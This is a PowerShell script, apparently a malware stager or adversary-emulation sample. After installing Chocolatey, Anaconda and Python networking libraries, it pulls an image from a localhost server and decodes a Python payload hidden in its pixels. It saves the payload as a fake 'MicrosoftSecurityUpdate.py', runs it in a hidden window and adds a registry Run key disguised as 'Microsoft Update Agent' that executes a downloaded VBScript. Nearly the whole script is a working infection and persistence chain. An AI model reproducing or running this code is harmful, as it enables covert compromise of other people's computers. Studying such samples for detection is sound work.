$InstallDir="$env:public\Chocolatey"
$env:ChocolateyInstall="$InstallDir"

Set-ExecutionPolicy Bypass -Scope Process -Force;

iex ((New-Object System.Net.WebClient).DownloadString('https://community.chocolatey.org/install.ps1'))

choco upgrade chocolatey --force -y

choco install anaconda3 --force -y --params '"/JustMe /AddToPath /D:C:\Users\Public\Chocolatey\tools"'

Import-Module "$env:ChocolateyInstall\helpers\chocolateyProfile.psm1"

refreshenv

conda update -n base -c defaults conda -y

conda install -c anaconda pip -y

pip install --no-input PySocks

pip install --no-input requests

# Download the image, extract the python script from it and save it on disk. 
Set-Alias abc New-Object;Add-Type -A System.Windows.Forms;($dd=abc System.Windows.Forms.PictureBox).Load("http://127.0.0.1/7.jpg");
$gg=$dd.Image;$oo=abc Byte[] 7680;(0..1)|%{foreach($x in(0..3839)){$p=$gg.GetPixel($x,$_);$oo[$_*3840+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};
$egh=[System.Text.Encoding]::UTF8.GetString($oo[0..5784]);Out-File -FilePath "$InstallDir\MicrosoftSecurityUpdate.py" -InputObject $egh -Force -Encoding utf8

New-Item "$InstallDir\MicrosoftSecurityUpdate.bat" -Force

Set-Content "$InstallDir\MicrosoftSecurityUpdate.bat" 'python C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.py'

Start-Process -WindowStyle Hidden python C:\Users\Public\Chocolatey\MicrosoftSecurityUpdate.py

# Registry run key persistence
$HashArguments = @{
	Path = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
	Name = "Microsoft Update Agent"
	Value = "wscript /Nologo /E:VBScript ""C:\Users\Public\Chocolatey\MSUpdateInfo.txt"""
	PropertyType = "String"
	Force = $true
}
New-ItemProperty @HashArguments

(New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/MSUpdateInfo.txt') > "C:\Users\Public\Chocolatey\MSUpdateInfo.txt"